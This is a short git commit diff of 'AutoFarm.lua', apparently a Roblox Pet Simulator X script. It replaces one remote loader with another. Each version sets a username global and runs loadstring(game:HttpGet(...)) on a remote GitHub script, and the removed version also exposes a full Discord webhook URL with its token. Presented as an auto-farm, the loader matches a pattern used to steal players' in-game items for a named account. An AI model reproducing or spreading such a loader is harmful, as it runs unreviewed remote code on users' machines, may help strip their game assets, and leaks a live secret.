5890787951a56ff49751bf810c8e2269047bd9ca
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-06-25 11:06:37 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,5 +1,2 @@
-_G.UserName = " " -- zenn2345 
-_G.UserName2 = " " -- zenn2345
-_G.Webhook = " " -- https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c
-   
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
+_G.UserName = "zenn2345"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
